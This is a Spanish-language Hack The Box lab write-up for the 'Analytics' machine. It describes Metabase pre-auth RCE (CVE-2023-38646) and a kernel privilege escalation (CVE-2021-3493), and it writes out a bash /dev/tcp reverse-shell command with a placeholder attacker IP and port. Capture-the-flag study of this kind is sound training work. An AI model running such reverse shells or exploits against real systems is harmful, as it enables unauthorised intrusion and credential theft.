---
layout: single
title: Analytics - Machines - Hack The Box
excerpt: "Analytics es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad en la herramienta Metabase, lo que nos permite la ejecución remota de código (RCE)."
date: 2023-10-10
classes: wide
header:
  teaser: /assets/images/htb-writeup-analytics/analytics.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - machines
 
tags:  
  - burpsuite
  - cve-2023-38646
  - cve-2021-3493
  - rce
  
---

![](/assets/images/htb-writeup-analytics/analytics.png)

Analytics es una máquina Linux de dificultad fácil que implica explotar una vulnerabilidad en la herramienta Metabase, lo que nos permite la ejecución remota de código (RCE).

# 1. Enumeración
   
Iniciamos con un escaneando de puertos de la máquina con Nmap.

## Portscan
Encontramos dos puertos abiertos. 
 -	22 de SSH 
 -	80 de HTTP

![](/assets/images/htb-writeup-analytics/analytics2.png)

Observamos un dominio y un subdominio que debemos agregar a nuestro archivo /etc/hosts.

![](/assets/images/htb-writeup-analytics/analytics3.png)

Agregamos los dominios y subdominios identificados.

 -	Analytics.htb

 -	Data.analytics.htb

![](/assets/images/htb-writeup-analytics/analytics4.png)

Navegamos sobre el sitio web e identificamos un portal de inicio de sesión donde ejecuta Metabase la cual es una herramienta de inteligencia empresarial de código abierto que le permite crear gráficos y paneles utilizando datos de una variedad de bases de datos y fuentes de datos. 

![](/assets/images/htb-writeup-analytics/analytics5.png)

# 2.	Explotación

Buscamos vulnerabilidades asociadas a esta herramienta e identificamos el CVE-2023-38646 el cual permite un RCE.

 -	PoC: https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/

La siguiente carga útil nos permitirá un RCE, para ello vamos a necesitar identificar el token el cual vamos a encontrar en la ruta /api/session/properties.

También vamos a necesitar codificar en base 64 un rever Shell.

 -	bash -i >&/dev/tcp/<IP>/<PORT> 0>&1

![](/assets/images/htb-writeup-analytics/analytics6.png)

Debemos poner nuestro equipo atacante a la escucha por el puerto del reverse Shell y enviar la solicita a través de BurSuite.

![](/assets/images/htb-writeup-analytics/analytics7.png)

Vamos a obtener un Shell como usuario metabase.

![](/assets/images/htb-writeup-analytics/analytics8.png)

Luego de un buen tiempo, ejecutamos el comando “env” vamos a identificar la contraseña del usuario “metalytics”.

![](/assets/images/htb-writeup-analytics/analytics9.png)

Usamos las credenciales obtenidas para iniciar sesión por SSH.

![](/assets/images/htb-writeup-analytics/analytics10.png)

De esta manera obtenemos nuestra primera flag.

![](/assets/images/htb-writeup-analytics/analytics11.png)

# 3.	Escalada de privilegios

Des pues de un tiempo buscando una forma de escalar privilegios, identificamos el siguiente exploit disponible.

-	Expoit: https://github.com/briskets/CVE-2021-3493
  
Vamos a clonarlo a nuetstra maquina y ejecutamos el siguiente comando para generar nuestro script.

-	gcc exploit.c -o exploit
  
Luego vamos a levantar un servidor en nuestra maquina atacante para descargar el explot a la maquina víctima.

![](/assets/images/htb-writeup-analytics/analytics12.png)

Descargamos nuestro exploit y otorgamos permisos de ejecución.

![](/assets/images/htb-writeup-analytics/analytics13.png)

Ejecutamos nuestro exploit, el cual permitirá elevar privilegios a root. A hora podemos leer nuestra segunda flag.

![](/assets/images/htb-writeup-analytics/analytics14.png)




